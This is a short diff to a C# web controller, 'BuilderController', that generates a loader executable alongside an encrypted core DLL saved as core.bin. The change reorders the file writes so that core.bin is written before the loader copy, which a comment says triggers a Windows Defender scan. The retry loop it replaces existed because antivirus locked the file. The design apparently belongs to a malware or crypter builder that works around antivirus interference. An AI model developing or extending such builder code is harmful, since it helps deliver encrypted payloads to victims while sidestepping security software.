@@ -494,25 +494,17 @@ public class BuilderController : ControllerBase
             // ── Move to final output ──
             var finalDir = Path.Combine(OutputBase, buildId);
             var finalPath = Path.Combine(finalDir, job.Record.FileName);
-            Directory.CreateDirectory(finalDir);
-            System.IO.File.Copy(exePath, finalPath, true);
-
-            // Write encrypted core DLL to final output (retry for antivirus lock)
             var finalCorePath = Path.Combine(finalDir, "core.bin");
-            for (int retry = 0; retry < 10; retry++)
-            {
-                try
-                {
-                    await using var fs = new FileStream(finalCorePath, FileMode.Create, FileAccess.Write, FileShare.None);
-                    await fs.WriteAsync(encryptedCore);
-                    break;
-                }
-                catch (IOException) when (retry < 9)
-                {
-                    job.Log($"[WARN] core.bin locked, retry {retry + 1}/10...");
-                    await Task.Delay(2000);
-                }
-            }
+            Directory.CreateDirectory(finalDir);
+
+            // Write core.bin FIRST (before loader copy triggers Defender scan)
+            job.Log("Writing core.bin...");
+            await System.IO.File.WriteAllBytesAsync(finalCorePath, encryptedCore);
+            job.Log($"core.bin written: {encryptedCore.Length / 1024} KB");
+
+            // Copy loader
+            job.Log("Copying loader...");
+            System.IO.File.Copy(exePath, finalPath, true);
 
             var fileInfo = new FileInfo(finalPath);
             job.Complete(fileInfo.Length);
